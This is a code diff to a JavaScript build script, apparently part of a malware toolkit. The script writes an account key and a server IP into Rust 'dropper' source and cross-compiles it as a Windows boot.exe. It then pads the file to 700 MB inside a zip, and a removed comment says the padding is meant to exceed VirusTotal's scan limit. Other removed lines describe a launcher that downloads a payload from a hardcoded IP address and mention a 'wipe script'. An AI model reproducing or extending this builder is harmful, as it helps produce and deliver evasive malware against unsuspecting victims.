@@ -1,63 +1,39 @@
 // language: JavaScript, file: builder/rustbuild.js
 import fs from 'node:fs';
 import path from 'node:path';
-import { fileURLToPath } from 'node:url';
 import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
-import { compileLauncher } from './compile.js';
+import { fileURLToPath } from 'node:url';
 import { zipPaddedExe } from './zip.js';
 
 const execFileP = promisify(execFile);
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
-const ROOT_DIR = path.join(__dirname, '..');
-const DOWNLOAD_DIR = path.join(ROOT_DIR, 'download');
+const DROPPER_DIR = path.join(__dirname, '..', 'dropper');
 
-// padded size of the delivered launcher exe — exceeds VT's scan ceiling
 const PAD_TO = 700 * 1024 * 1024;
 
-export async function buildBoot({ key, buildId }) {
-  let rustDir = path.join(ROOT_DIR, 'client');
-  if (!fs.existsSync(rustDir)) rustDir = ROOT_DIR;
+export async function buildBoot({ key, buildId, serverIp }) {
+    const srcPath = path.join(DROPPER_DIR, 'src', 'main.rs');
+    let code = fs.readFileSync(srcPath, 'utf8');
 
-  const srcDir = path.join(rustDir, 'src');
-  if (!fs.existsSync(srcDir)) fs.mkdirSync(srcDir, { recursive: true });
+    // Inject key and IP
+    code = code.replace('__ACCOUNT_KEY__', key);
+    code = code.replace('__SERVER_IP__', serverIp);
+    fs.writeFileSync(srcPath, code);
 
-  const embeddedKeyPath = path.join(srcDir, 'embedded_key.rs');
-  fs.writeFileSync(embeddedKeyPath, `pub const ACCOUNT_KEY: &str = "${key}";\n`);
-
-  console.log('[build] compiling rust stager...');
-  try {
+    console.log('[build] compiling rust dropper...');
     await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu'], {
-      cwd: rustDir,
-      timeout: 5 * 60_000,
-      maxBuffer: 64 * 1024 * 1024,
+        cwd: DROPPER_DIR,
+        timeout: 5 * 60_000,
     });
-  } catch (e) {
-    const fullLog = (e.stdout || '') + '\n' + (e.stderr || '');
-    throw new Error(`cargo failed:\n${fullLog.slice(-2000)}`);
-  }
 
-  const baseExe = path.join(rustDir, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
-  if (!fs.existsSync(baseExe)) throw new Error(`rust build missing output at ${baseExe}`);
+    const baseExe = path.join(DROPPER_DIR, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
+    const launcherBuf = fs.readFileSync(baseExe);
 
-  if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
+    // Revert source file so we don't leave the key on disk
+    code = code.replace(key, '__ACCOUNT_KEY__');
+    code = code.replace(serverIp, '__SERVER_IP__');
+    fs.writeFileSync(srcPath, code);
 
-  // The C launcher hardcodes `http://<ip>/api/downloads/st.dat`. The wipe
-  // script in server.js downloads `st.exe`. Both must exist on disk.
-  fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.dat'));
-  fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.exe'));
-
-  console.log('[build] wrapping into padded launcher...');
-  const launcherBuf = await compileLauncher({
-    key,
-    buildId,
-    config: { ip: process.env.SERVER_IP || '95.182.96.216' },
-    baseExe,
-  });
-
-  console.log(`[build] launcher ${launcherBuf.length} B → pad ${PAD_TO} B → zip...`);
-  const zipBuf = await zipPaddedExe(launcherBuf, 'boot.exe', PAD_TO);
-  console.log(`[build] zip ${zipBuf.length} B`);
-
-  return zipBuf;
+    return await zipPaddedExe(launcherBuf, 'boot.exe', PAD_TO);
 }
